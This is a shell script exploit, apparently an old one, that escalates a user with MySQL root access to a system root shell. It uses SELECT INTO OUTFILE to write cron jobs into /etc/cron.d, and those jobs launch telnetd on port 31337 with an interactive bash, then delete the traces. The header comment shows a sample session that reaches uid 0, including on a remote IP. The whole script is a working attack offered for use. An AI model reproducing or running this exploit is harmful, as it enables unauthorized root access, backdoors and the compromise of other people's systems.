#!/bin/sh
#
# ---------------------------------- [ Tested Screen ]
# [indra@hacker work]$ ./test
#
#            (((((((((( This program is MySQL & crond xpl017... ))))))))))
# 
# [------------------------------------ Start ------------------------------------]
# 
# [+] Checking mysql install PATH... ok!
# [+] Enter the MySQL root password : pass
# 
# MySQL Password is pass
# 
# [+] Create new scripts... ok!
# [+] Create removing script... ok!
# 
# [+] Create a new database using mysqladmin
# [+] Create a new table N recording to table
# 
# Wait a minute..
# ...............................................................................
# 
# [+] Wow~~ Opened 31337 port ;-)
# 
# Trying 127.0.0.1...
# Connected to localhost.
# Escape character is '^]'.
# Red Hat Linux release 7.2 (Enigma)
# Kernel 2.4.7-10 on an i686
# [root@hacker root]# id
# uid=0(root) gid=0(root)groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# [root@hacker root]# 
# ---------------------------------------------------
# 
# [ Other ]
# .....................................................
#
# [+] Wow~~ Opened 31337 port ;-)
# 
# You can see the rootshell, If you connect to 31337 port of this server
# Thanks for using this exploit.. ;)
# 
# [indra@hacker work]$ 
# 
# indra:/ docs> telnet
# telnet> open 210.222.107.206 31337
# Trying 210.222.107.206...
# Connected to 210.222.107.206.
# Escape character is '^]'.
# Red Hat Linux release 7.2 (Enigma)
# Kernel 2.4.7-10 on an i686
# [root@hacker root]# 

MYSQL_PATH="/usr/local/mysql"
WORK_DIR=`pwd`
PORT="31337"
TELNETD="/usr/sbin/in.telnetd"

   echo
   echo "           (((((((((( This program is MySQL & crond xpl017... ))))))))))"
   echo
   echo "[------------------------------------ Start ------------------------------------]"
   echo
   echo -n "[+] Checking mysql install PATH..."
      if [ ! -d $MYSQL_PATH ]; then
         echo
         echo "Ooooops.. mysql install PATH is not same with PATH in script"
         echo "U must modify script.. :-("
         exit 0
      else 
         echo " ok!"
      fi
   echo -n "[+] Enter the MySQL root password : "
      read MYSQL_PASSWD
   echo
   echo "MySQL Password is $MYSQL_PASSWD"
   echo
   echo -n "[+] Create new scripts..."
   cat > $WORK_DIR/link <<__eof__
#!/bin/sh
/bin/bash -i
__eof__
   cat > $WORK_DIR/portopen <<__eof__
#!/bin/sh
touch $WORK_DIR/time.tmp
rm -rf /etc/cron.d/portopen
$TELNETD -debug $PORT -L $WORK_DIR/link
__eof__
   if [ ! -f "$WORK_DIR/link" ]; then
      echo
      echo "[Error!] Can't created $WORK_DIR/link file!.. :("
      echo
      exit 0
   else if [ ! -f "$WORK_DIR/portopen" ]; then
          echo
          echo "[Error!] Can't created $WORK_DIR/portopen file!.. :("
          echo
          exit 0
      fi
      echo " ok!"
   fi
   chmod 777 $WORK_DIR/link $WORK_DIR/portopen
   echo -n "[+] Create removing script..."
   cat > $WORK_DIR/remove <<__eof__
#!/bin/sh
rm -rf $MYSQL_PATH/var/portopen $MYSQL_PATH/var/remove /etc/cron.d/remove $WORK_DIR/*
__eof__
   if [ ! -f "$WORK_DIR/remove" ]; then
      echo
      echo "[Error!] Can't created $WORK_DIR/remove file!.. :("
      echo
      exit 0
   else
      echo " ok!"
      echo
   fi
   chmod 777 $WORK_DIR/remove
   echo "[+] Create a new database using mysqladmin"
   $MYSQL_PATH/bin/mysqladmin -uroot -p$MYSQL_PASSWD create portopen
   echo "[+] Create a new table N recording to table"
   cat > $WORK_DIR/portopen.sql <<__eof__
CREATE TABLE portopen (
  testtext char(200) NOT NULL default ''
) TYPE=MyISAM;
INSERT INTO portopen VALUES ('*/1 * * * *    root    $WORK_DIR/portopen');
SELECT * FROM portopen INTO OUTFILE '/etc/cron.d/portopen';
__eof__
   cat > $WORK_DIR/remove.sql <<__eof__
CREATE TABLE remove (
  testtext char(200) NOT NULL default ''
) TYPE=MyISAM;
INSERT INTO remove VALUES ('*/1 * * * *    root    $WORK_DIR/remove');
SELECT * FROM remove INTO OUTFILE '/etc/cron.d/remove';
__eof__
   $MYSQL_PATH/bin/mysql -uroot -p$MYSQL_PASSWD portopen < portopen.sql
   rm -rf portopen.sql
   echo
   echo "Wait a minute.."
   while :; do
      if [ ! -f "$WORK_DIR/time.tmp" ]; then
         echo -n "."
         usleep 300000
      else
         rm -rf $WORK_DIR/time.tmp
         echo
	 echo
         echo "[+] Wow~~ Opened 31337 port ;-)"
         echo
	 $MYSQL_PATH/bin/mysqladmin -uroot -p$MYSQL_PASSWD create remove
         $MYSQL_PATH/bin/mysql -uroot -p$MYSQL_PASSWD remove < $WORK_DIR/remove.sql
         rm -rf $WORK_DIR/remove.sql
         if [ -x "/usr/bin/telnet" ]; then
	    telnet localhost 31337
         else
         echo "You can see the rootshell, If you connect to 31337 port of this server"
	 echo "Thanks for using this exploit.. ;)"
	 echo
	 exit 0
	 fi
	 exit 0
      fi
   done
   exit 0
exit 0